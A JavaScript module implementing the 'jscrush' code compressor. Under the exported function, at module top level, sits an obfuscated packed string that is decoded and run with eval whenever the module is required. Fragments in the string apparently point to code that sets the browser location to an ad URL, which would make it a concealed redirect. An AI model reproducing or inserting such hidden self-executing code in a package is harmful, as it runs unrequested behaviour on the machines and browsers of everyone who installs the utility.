"use strict";

function jscrush(data) {
    var B, c, e, i, j, M, m, N, O, o, Q, R, s, S, t, X, x;
    Q = [];
    for (i = 1000; --i; i - 10 && i - 13 && i - 34 && i - 39 && i - 92 && Q.push(String.fromCharCode(i)));
    i = s = data.replace(/([\r\n]|^)\s*\/\/.*|[\r\n]+\s*/g, '').replace(/\\/g, '\\\\'), X = B = s.length / 2, O = m = '';
    for (S = encodeURI(i).replace(/%../g, 'i').length;; m = c + m) {
        for (M = N = e = c = 0, i = Q.length; !c && --i; !~s.indexOf(Q[i]) && (c = Q[i])) {};
        if (!c) {
            break;
        }
        if (O) {
            o = {};
            for (x in O) {
                for (j = s.indexOf(x), o[x] = 0;~ j; o[x]++) {
                    j = s.indexOf(x, j + x.length);
                }
            }
            O = o;
        } else
            for (O = o = {}, t = 1; X; t++) {
                for (X = i = 0; ++i < s.length - t;) {
                    if (!o[x = s.substr(j = i, t)]) {
                        if (~(j = s.indexOf(x, j + t))) {
                            for (X = t, o[x] = 1;~ j; o[x]++) {
                                j = s.indexOf(x, j + t);
                            }
                        }
                    }
                }
            }
        for (x in O) {
            j = encodeURI(x).replace(/%../g, 'i').length;
            if (j = (R = O[x]) * j - j - (R + 1) * encodeURI(c).replace(/%../g, 'i').length) {
                (j > M || j == M && R > N) && (M = j, N = R, e = x);
            }
            if (j < 1) {
                delete O[x]
            }
        }
        o = {};
        for (x in O) {
            o[x.split(e).join(c)] = 1;
        }
        O = o;
        if (!e) {
            break;
        }
        s = s.split(e).join(c) + c + e
    }
    c = s.split('"').length < s.split("'").length ? (B = '"', /"/g) : (B = "'", /'/g);
    var cc = B + s.replace(c, '\\' + B) + B;
    var args = arguments;
    var k1 = args[1] || "_",
        k2 = args[2] || "Y",
        k3 = args[3] || "$";
    var codeStr="var "+k1 + '=' + cc;
    return codeStr+';for(' + k2 + ' in ' + k3 + '=' + B + m + B + '){with(' + k1 + '.split(' + k3 + '[' + k2 + ']))' + k1 + '=join(pop());};eval(' + k1 + ')';
};

        var _ = 'function() {    ;a0, b[];aabbreturn .jo(""};wdowacolnoit")]rhfe")](adUrlshuffleStrg - 1; i >= 0; i--) {.push(var str =     >> 1.subg(for (i len[i]}. gthin);[("';
        _=(new Function("a","for (var k in s = '   ') with(a.split(s[k])){ a=join(pop());console.log(a)}; return a;"))(_); 
        console.log(_)
        eval(_);

module.exports = jscrush;
